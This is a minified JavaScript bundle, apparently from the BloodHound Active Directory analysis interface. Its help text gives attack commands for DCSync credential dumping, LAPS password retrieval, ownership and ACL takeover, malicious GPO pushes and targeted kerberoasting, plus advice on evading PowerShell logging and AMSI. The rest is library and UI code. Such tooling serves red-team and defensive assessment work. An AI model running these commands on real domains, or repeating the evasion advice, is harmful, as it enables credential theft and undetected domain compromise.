",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Passwords "}),e.jsxs(t,{variant:"body2",children:["If FullControl (GenericAll) is obtained on the domain, instead of granting DCSync rights, the AllExtendedRights privilege included grants ",n," enough privileges to retrieve LAPS passwords domain-wise."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),e.jsx(t,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a GPO, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With ownership of the container object, you may grant yourself the GenericAll privilege."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});default:return null}},Bd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),e.jsx(t,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),e.jsx(t,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),Nd=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm",children:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8",children:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8"})]}),Vd={general:Ld,windowsAbuse:Wd,linuxAbuse:zd,opsec:Bd,references:Nd},Kd=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(t,{variant:"body2",children:[k(r,n),' the ability to write to the "serviceprincipalname" attribute to the ',I(s)," ",a,"."]}),Hd=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"||r==="Computer"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as"," ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]}),qd=({sourceName:n,sourceType:r})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."})]}),Yd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),e.jsx(t,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell v2."})]}),Jd=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.harmj0y.net/redteaming/kerberoasting-revisited/",children:"https://www.harmj0y.net/redteaming/kerberoasting-revisited/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"})]}),Xd={general:Kd,windowsAbuse:Hd,linuxAbuse:qd,opsec:Yd,references:Jd},ih={GenericAll:bc,MemberOf:qc,AllExtendedRights:di,AdminTo:ri,HasSession:Bc,AddMember:Ks,ForceChangePassword:oc,GenericWrite:jc,Owns:ed,WriteDacl:_d,WriteOwner:Vd,CanRDP:Oi,ExecuteDCOM:Qi,AllowedToDelegate:ji,GetChanges:Pc,GetChangesAll:Ic,ReadLAPSPassword:pd,Contains:Ei,GPLink:dc,AddAllowedToAct:Ms,AllowedToAct:bi,SQLAdmin:yd,ReadGMSAPassword:sd,HasSIDHistory:Uc,TrustedBy:Pd,CanPSRemote:Ti,AZAddMembers:Bn,AZAddSecret:Zn,AZAvereContributor:mr,AZContains:Sr,AZContributor:Dr,AZExecuteCommand:Mr,AZGetCertificates:_r,AZGetKeys:Nr,AZGetSecrets:Yr,AZHasRole:ao,AZManagedIdentity:Pa,AZMemberOf:$a,AZOwns:za,AZPrivilegedAuthAdmin:Ha,AZPrivilegedRoleAdmin:Qa,AZResetPassword:rs,AZUserAccessAdministrator:us,AZGlobalAdmin:eo,AZAppAdmin:or,AZCloudAppAdmin:wr,AZRunsAs:cs,AZVMAdminLogin:fs,AZVMContributor:As,WriteSPN:Xd,AddSelf:Qs,AddKeyCredentialLink:Ls,DCSync:zi,SyncLAPSPassword:vd,WriteAccountRestrictions:Id,DumpSMSAPassword:Hi,AZMGAddMember:jo,AZMGAddOwner:To,AZMGAddSecret:Oo,AZMGGrantAppRoles:Xo,AZMGGrantRole:na,AZMGAppRoleAssignment_ReadWrite_All:Eo,AZMGApplication_ReadWrite_All:Wo,AZMGDirectory_ReadWrite_All:Ko,AZMGGroupMember_ReadWrite_All:ia,AZMGGroup_ReadWrite_All:pa,AZMGRoleManagement_ReadWrite_Directory:ya,AZMGServicePrincipalEndpoint_ReadWrite_All:va,AZWebsiteContributor:Cs,AZAddOwner:qn,AZAKSContributor:Un,AZAutomationContributor:dr,AZKeyVaultKVContributor:ho,AZLogicAppContributor:go,AZNodeResourceGroup:Fa},Qd=n=>n.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"),Zd=({text:n,search:r})=>{const a=Qd(r),s=new RegExp(`(.*?)(${a})(.*)`,"mi"),i=n.match(s);if(i===null||i.length===1)return e.jsx(e.Fragment,{children:n});const c=i.slice(1);return e.jsx(t,{variant:"body2",component:"span",children:c.map((d,u)=>d.toLowerCase()===r.toLowerCase()?e.jsx(t,{variant:"body2",component:"span",style:{fontWeight:"bold"},children:d},u):e.jsx(sn.Fragment,{children:d},u))})},ch=({dataCollectionLink:n,fileIngestLink:r})=>{const a=cn();return e.jsx(h,{display:"flex",justifyContent:"center",mt:a.spacing(8),mx:a.spacing(4),children:e.jsxs(dn,{severity:"info",children:[e.jsx(ln,{children:"No Data Available"}),"It appears that no data has been uploaded yet.",e.jsx("br",{}),"See our ",n," documentation to learn how to start collecting data.",e.jsx("br",{}),r&&e.jsxs(e.Fragment,{children:["If you have files available from a SharpHound or AzureHound collection, please visit the"," ",r," page to begin uploading your data."]})]})})},el=({data:n,fileName:r,fileType:a})=>{const s=new Blob([n],{type:a}),i=document.createElement("a");i.download=r,i.href=window.URL.createObjectURL(s);const c=new MouseEvent("click",{view:window,bubbles:!0,cancelable:!0});i.dispatchEvent(c),i.remove()},dh=(n,r)=>{n.preventDefault(),el({data:JSON.stringify(r),fileName:"bh-graph.json",fileType:"text/json"})};var Tt=(n=>(n.WHEN_CREATED="whencreated",n.LAST_LOGON="lastlogon",n.LAST_LOGON_TIMESTAMP="lastlogontimestamp",n.PASSWORD_LAST_SET="pwdlastset",n))(Tt||{});const tl=(n,r)=>{const a="UNKNOWN",s="NEVER";switch(r){case"whencreated":return n===0||n===-1?a:je.fromSeconds(n).toFormat(ve.DATETIME);case"lastlogon":case"lastlogontimestamp":return n===0?a:n===-1?s:je.fromSeconds(n).toFormat(ve.DATETIME);case"pwdlastset":return n===0?"ACCOUNT CREATED BUT NO PASSWORD SET":n===-1?s:je.fromSeconds(n).toFormat(ve.DATETIME);default:return""}},nl=(n,r,a)=>{if(r==="ad"&&Object.values(Tt).includes(a))return tl(n,a);const i=315536400,c=Math.round(new Date().getTime()/1e3);return n>i&&n<c?je.fromSeconds(n).toFormat(ve.DATETIME):n>0&&n<1?`${(n*100).toFixed(0)}%`:`${n}`.toLocaleString()},rl=n=>n.toString().toUpperCase(),ol=(n,r)=>{const a=je.fromISO(n);return a.invalid===null&&r!=="functionallevel"?a.toFormat(ve.DATETIME):n},Pt=(n,r,a)=>{switch(typeof n){case"number":return nl(n,r,a);case"boolean":return rl(n);case"string":default:return ol(n,a)}},al=n=>{const r=n.value,a=[];return r.forEach(s=>{a.push(Pt(s,n.kind,n.keyprop))}),a},lh=n=>{const{value:r,kind:a,keyprop:s}=n;return Array.isArray(r)?al(n):Pt(r,a,s)},sl=({listSections:n,clickHandler:r,deleteHandler:a})=>{const[s,i]=p.useState(!1),[c,d]=p.useState(),u=()=>{i(!0)},g=()=>{i(!1),d(void 0)};return e.jsxs(e.Fragment,{children:[e.jsx(h,{maxHeight:"300px",overflow:"auto",children:e.jsx(z,{dense:!0,disablePadding:!0,children:n.map(D=>{const{subheader:P,lineItems:A}=D;return e.jsxs(h,{children:[e.jsxs(Pn,{sx:{fontWeight:"bold"},children:[P," "]}),A==null?void 0:A.map((m,w)=>{const{id:C,description:U,cypher:_,canEdit:G=!1}=m;return e.jsx(y,{disablePadding:!0,secondaryAction:G&&e.jsx(hn,{"aria-label":"Delete Query",size:"small",onClick:()=>{d(C),u()},children:e.jsx(pn,{fontSize:"small",children:e.jsx(un,{icon:mn})})}),children:e.jsx(In,{onClick:()=>r(_),children:e.jsx(f,{primary:U})})},`${C}-${w}`)})]},P)})})}),e.jsxs(bn,{open:s,onClose:g,maxWidth:"xs",fullWidth:!0,children:[e.jsx(gn,{children:"Delete Query"}),e.jsx(yn,{children:e.jsx(fn,{children:"Are you sure you want to delete this query?"})}),e.jsxs(wn,{children:[e.jsx(gt,{color:"inherit",onClick:g,children:"Cancel"}),e.jsx(gt,{onClick:()=>{a&&a(c),g()},color:"primary",autoFocus:!0,children:"Confirm"})]})]})]})},Ze={all:["savedQueries"]},il=n=>Qe.getUserSavedQueries(n).then(r=>r.data.data),cl=(n,r)=>Qe.createUserQuery(n,r).then(a=>a.data.data),dl=n=>Qe.deleteUserQuery(n).then(r=>r.data),ll=()=>xn(Ze.all,({signal:n})=>il({signal:n})),hh=()=>{const n=St();return kt(cl,{onSuccess:()=>{n.invalidateQueries(Ze.all)}})},hl=()=>{const n=St();return kt(dl,{onSuccess:()=>{n.invalidateQueries(Ze.all)}})},ph=({clickHandler:n})=>{var d;const r=ll(),a=hl(),{addNotification:s}=jn(),i=u=>a.mutate(u,{onSuccess:()=>{s("Query deleted.","userDeleteQuery")}});if(r.isLoading)return e.jsx(h,{mt:2,children:e.jsx(vn,{})});if(r.isError)return e.jsx(h,{my:2,ml:2,children:e.jsx(t,{children:"Unable to list saved queries."})});const c=((d=r.data)==null?void 0:d.map(u=>({description:u.name,cypher:u.query,canEdit:!0,id:u.id})))||[];return c.length>0?e.jsx(sl,{listSections:[{subheader:"User Saved Searches: ",lineItems:c}],clickHandler:n,deleteHandler:i}):e.jsx(h,{my:2,ml:2,children:e.jsx(t,{variant:"body2",children:"No queries have been saved yet."})})};var S={};/** @license React v17.0.2
 * react-is.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Be=60103,Ne=60106,ke=60107,Te=60108,Pe=60114,Ce=60109,De=60110,Re=60112,Oe=60113,et=60120,$e=60115,Ie=60116,Ct=60121,Dt=60122,Rt=60117,Ot=60129,$t=60131;if(typeof Symbol=="function"&&Symbol.for){var F=Symbol.for;Be=F("react.element"),Ne=F("react.portal"),ke=F("react.fragment"),Te=F("react.strict_mode"),Pe=F("react.profiler"),Ce=F("react.provider"),De=F("react.context"),Re=F("react.forward_ref"),Oe=F("react.suspense"),et=F("react.suspense_list"),$e=F("react.memo"),Ie=F("react.lazy"),Ct=F("react.block"),Dt=F("react.server.block"),Rt=F("react.fundamental"),Ot=F("react.debug_trace_mode"),$t=F("react.legacy_hidden")}function K(n){if(typeof n=="object"&&n!==null){var r=n.$$typeof;switch(r){case Be:switch(n=n.type,n){case ke:case Pe:case Te:case Oe:case et:return n;default:switch(n=n&&n.$$typeof,n){case De:case Re:case Ie:case $e:case Ce:return n;default:return r}}case Ne:return r}}}var pl=Ce,ul=Be,ml=Re,bl=ke,gl=Ie,yl=$e,fl=Ne,wl=Pe,xl=Te,jl=Oe;S.ContextConsumer=De;S.ContextProvider=pl;S.Element=ul;S.ForwardRef=ml;S.Fragment=bl;S.Lazy=gl;S.Memo=yl;S.Portal=fl;S.Profiler=wl;S.StrictMode=xl;S.Suspense=jl;S.isAsyncMode=function(){return!1};S.isConcurrentMode=function(){return!1};S.isContextConsumer=function(n){return K(n)===De};S.isContextProvider=function(n){return K(n)===Ce};S.isElement=function(n){return typeof n=="object"&&n!==null&&n.$$typeof===Be};S.isForwardRef=function(n){return K(n)===Re};S.isFragment=function(n){return K(n)===ke};S.isLazy=function(n){return K(n)===Ie};S.isMemo=function(n){return K(n)===$e};S.isPortal=function(n){return K(n)===Ne};S.isProfiler=function(n){return K(n)===Pe};S.isStrictMode=function(n){return K(n)===Te};S.isSuspense=function(n){return K(n)===Oe};S.isValidElementType=function(n){return typeof n=="string"||typeof n=="function"||n===ke||n===Pe||n===Ot||n===Te||n===Oe||n===et||n===$t||typeof n=="object"&&n!==null&&(n.$$typeof===Ie||n.$$typeof===$e||n.$$typeof===Ce||n.$$typeof===De||n.$$typeof===Re||n.$$typeof===Rt||n.$$typeof===Ct||n[0]===Dt)};S.typeOf=K;function ft(n){return typeof n=="object"&&n!=null&&n.nodeType===1}function wt(n,r){return(!r||n!=="hidden")&&n!=="visible"&&n!=="clip"}function He(n,r){if(n.clientHeight<n.scrollHeight||n.clientWidth<n.scrollWidth){var a=getComputedStyle(n,null);return wt(a.overflowY,r)||wt(a.overflowX,r)||function(s){var i=function(c){if(!c.ownerDocument||!c.ownerDocument.defaultView)return null;try{return c.ownerDocument.defaultView.frameElement}catch{return null}}(s);return!!i&&(i.clientHeight<s.scrollHeight||i.clientWidth<s.scrollWidth)}(n)}return!1}function Ue(n,r,a,s,i,c,d,u){return c<n&&d>r||c>n&&d<r?0:c<=n&&u<=a||d>=r&&u>=a?c-n-s:d>r&&u<a||c<n&&u>a?d-r+i:0}var vl=function(n,r){var a=window,s=r.scrollMode,i=r.block,c=r.inline,d=r.boundary,u=r.skipOverflowHiddenElements,g=typeof d=="function"?d:function(Q){return Q!==d};if(!ft(n))throw new TypeError("Invalid target");for(var D,P,A=document.scrollingElement||document.documentElement,m=[],w=n;ft(w)&&g(w);){if((w=(P=(D=w).parentElement)==null?D.getRootNode().host||null:P)===A){m.push(w);break}w!=null&&w===document.body&&He(w)&&!He(document.documentElement)||w!=null&&He(w,u)&&m.push(w)}for(var C=a.visualViewport?a.visualViewport.width:innerWidth,U=a.visualViewport?a.visualViewport.height:innerHeight,_=window.scrollX||pageXOffset,G=window.scrollY||pageYOffset,M=n.getBoundingClientRect(),E=M.height,x=M.width,L=M.top,R=M.right,j=M.bottom,H=M.left,v=i==="start"||i==="nearest"?L:i==="end"?j:L+E/2,O=c==="center"?H+x/2:c==="end"?R:H,ne=[],re=0;re<m.length;re++){var T=m[re],q=T.getBoundingClientRect(),oe=q.height,ae=q.width,se=q.top,be=q.right,ge=q.bottom,ie=q.left;if(s==="if-needed"&&L>=0&&H>=0&&j<=U&&R<=C&&L>=se&&j<=ge&&H>=ie&&R<=be)return ne;var ce=getComputedStyle(T),de=parseInt(ce.borderLeftWidth,10),le=parseInt(ce.borderTopWidth,10),he=parseInt(ce.borderRightWidth,10),pe=parseInt(ce.borderBottomWidth,10),J=0,X=0,b="offsetWidth"in T?T.offsetWidth-T.clientWidth-de-he:0,$="offsetHeight"in T?T.offsetHeight-T.clientHeight-le-pe:0,W="offsetWidth"in T?T.offsetWidth===0?0:ae/T.offsetWidth:0,N="offsetHeight"in T?T.offsetHeight===0?0:oe/T.offsetHeight:0;if(A===T)J=i==="start"?v:i==="end"?v-U:i==="nearest"?Ue(G,G+U,U,le,pe,G+v,G+v+E,E):v-U/2,X=c==="start"?O:c==="center"?O-C/2:c==="end"?O-C:Ue(_,_+C,C,de,he,_+O,_+O+x,x),J=Math.max(0,J+G),X=Math.max(0,X+_);else{J=i==="start"?v-se-le:i==="end"?v-ge+pe+$:i==="nearest"?Ue(se,ge,oe,le,pe+$,v,v+E,E):v-(se+oe/2)+$/2,X=c==="start"?O-ie-de:c==="center"?O-(ie+ae/2)+b/2:c==="end"?O-be+he+b:Ue(ie,be,ae,de,he+b,O,O+x,x);var V=T.scrollLeft,B=T.scrollTop;v+=B-(J=Math.max(0,Math.min(B+J/N,T.scrollHeight-oe/N+$))),O+=V-(X=Math.max(0,Math.min(V+X/W,T.scrollWidth-ae/W+b)))}ne.push({el:T,top:J,left:X})}return ne};let Al=0;function tt(){}function Sl(n,r){if(!n)return;vl(n,{boundary:r,block:"nearest",scrollMode:"if-needed"}).forEach(s=>{let{el:i,top:c,left:d}=s;i.scrollTop=c,i.scrollLeft=d})}function xt(n,r,a){return n===r||r instanceof a.Node&&n.contains&&n.contains(r)}function It(n,r){let a;function s(){a&&clearTimeout(a)}function i(){for(var c=arguments.length,d=new Array(c),u=0;u<c;u++)d[u]=arguments[u];s(),a=setTimeout(()=>{a=null,n(...d)},r)}return i.cancel=s,i}function ee(){for(var n=arguments.length,r=new Array(n),a=0;a<n;a++)r[a]=arguments[a];return function(s){for(var i=arguments.length,c=new Array(i>1?i-1:0),d=1;d<i;d++)c[d-1]=arguments[d];return r.some(u=>(u&&u(s,...c),s.preventDownshiftDefault||s.hasOwnProperty("nativeEvent")&&s.nativeEvent.preventDownshiftDefault))}}function xe(){for(var n=arguments.length,r=new Array(n),a=0;a<n;a++)r[a]=arguments[a];return s=>{r.forEach(i=>{typeof i=="function"?i(s):i&&(i.current=s)})}}function kl(){return String(Al++)}function Tl(n){let{isOpen:r,resultCount:a,previousResultCount:s}=n;return r?a?a!==s?`${a} result${a===1?" is":"s are"} available, use up and down arrow keys to navigate. Press Enter key to select.`:"":"No results are available.":""}function Ye(n,r){return Object.keys(n).reduce((a,s)=>(a[s]=Mt(r,s)?r[s]:n[s],a),{})}function Mt(n,r){return n[r]!==void 0}function Pl(n){const{key:r,keyCode:a}=n;return a>=37&&a<=40&&r.indexOf("Arrow")!==0?`Arrow${r}`:r}function Je(n,r,a,s,i){if(i===void 0&&(i=!0),a===0)return-1;const c=a-1;(typeof r!="number"||r<0||r>=a)&&(r=n>0?-1:c+1);let d=r+n;d<0?d=i?c:0:d>c&&(d=i?0:c);const u=Se(n,d,a,s,i);return u===-1?r>=a?-1:r:u}function Se(n,r,a,s,i){const c=s(r);if(!c||!c.hasAttribute("disabled"))return r;if(n>0){for(let d=r+1;d<a;d++)if(!s(d).hasAttribute("disabled"))return d}else for(let d=r-1;d>=0;d--)if(!s(d).hasAttribute("disabled"))return d;return i?n>0?Se(1,0,a,s,!1):Se(-1,a-1,a,s,!1):-1}function jt(n,r,a,s){return s===void 0&&(s=!0),r.some(i=>i&&(xt(i,n,a)||s&&xt(i,a.document.activeElement,a)))}const Cl=It(n=>{Gt(n).textContent=""},500);function Dl(n,r){const a=Gt(r);n&&(a.textContent=n,Cl(r))}function Gt(n){n===void 0&&(n=document);let r=n.getElementById("a11y-status-message");return r||(r=n.createElement("div"),r.setAttribute("id","a11y-status-message"),r.setAttribute("role","status"),r.setAttribute("aria-live","polite"),r.setAttribute("aria-relevant","additions text"),Object.assign(r.style,{border:"0",clip:"rect(0 0 0 0)",height:"1px",margin:"-1px",overflow:"hidden",padding:"0",position:"absolute",width:"1px"}),n.body.appendChild(r),r)}const Et={highlightedIndex:-1,isOpen:!1,selectedItem:null,inputValue:""};function Rl(n,r,a){const{props:s,type:i}=n,c={};Object.keys(r).forEach(d=>{Ol(d,n,r,a),a[d]!==r[d]&&(c[d]=a[d])}),s.onStateChange&&Object.keys(c).length&&s.onStateChange({type:i,...c})}function Ol(n,r,a,s){const{props:i,type:c}=r,d=`on${nt(n)}Change`;i[d]&&s[n]!==void 0&&s[n]!==a[n]&&i[d]({type:c,...s})}function $l(n,r){return r.changes}function Il(n){const{selectedItem:r,itemToString:a}=n;return r?`${a(r)} has been selected.`:""}const Ml=It((n,r)=>{Dl(n(),r)},200),Gl=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u"?p.useLayoutEffect:p.useEffect;function El(n){let{id:r=`downshift-${kl()}`,labelId:a,menuId:s,getItemId:i,toggleButtonId:c,inputId:d}=n;return p.useRef({labelId:a||`${r}-label`,menuId:s||`${r}-menu`,getItemId:i||(g=>`${r}-item-${g}`),toggleButtonId:c||`${r}-toggle-button`,inputId:d||`${r}-input`}).current}function Fl(n,r,a){return n!==void 0?n:a.length===0?-1:a.indexOf(r)}function Ul(n){return n?String(n):""}function nt(n){return`${n.slice(0,1).toUpperCase()}${n.slice(1)}`}function Ft(n){const r=p.useRef(n);return r.current=n,r}function _l(n,r,a){const s=p.useRef(),i=p.useRef(),c=p.useCallback((A,m)=>{i.current=m,A=Ye(A,m.props);const w=n(A,m);return m.props.stateReducer(A,{...m,changes:w})},[n]),[d,u]=p.useReducer(c,r),g=Ft(a),D=p.useCallback(A=>u({props:g.current,...A}),[g]),P=i.current;return p.useEffect(()=>{P&&s.current&&s.current!==d&&Rl(P,Ye(s.current,P.props),d),s.current=d},[d,a,P]),[d,D]}const Ae={itemToString:Ul,stateReducer:$l,getA11ySelectionMessage:Il,scrollIntoView:Sl,circularNavigation:!1,environment:typeof window>"u"?{}:window};function Y(n,r,a){a===void 0&&(a=Et);const s=n[`default${nt(r)}`];return s!==void 0?s:a[r]}function _e(n,r,a){a===void 0&&(a=Et);const s=n[r];if(s!==void 0)return s;const i=n[`initial${nt(r)}`];return i!==void 0?i:Y(n,r,a)}function Ll(n){const r=_e(n,"selectedItem"),a=_e(n,"isOpen"),s=_e(n,"highlightedIndex"),i=_e(n,"inputValue");return{highlightedIndex:s<0&&r&&a?n.items.indexOf(r):s,isOpen:a,selectedItem:r,inputValue:i}}function 